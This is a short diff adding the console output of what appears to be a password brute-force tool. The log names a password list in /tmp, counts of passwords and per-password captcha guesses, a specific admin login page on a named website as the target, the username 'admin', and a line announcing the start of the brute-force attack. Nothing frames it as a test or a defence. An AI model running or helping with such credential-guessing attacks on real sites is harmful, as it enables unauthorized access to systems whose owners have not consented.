@@ -1,0 +1,8 @@
+[*] 密码文件: /tmp/pwds.txt
+[*] 密码数量: 10
+[*] 每个密码验证码数: 500
+[*] 总尝试次数: 5000
+[*] 目标: http://www.chinanaisi.com/admin/check_admin.asp
+[*] 用户名: admin
+[*] 开始爆破...
+
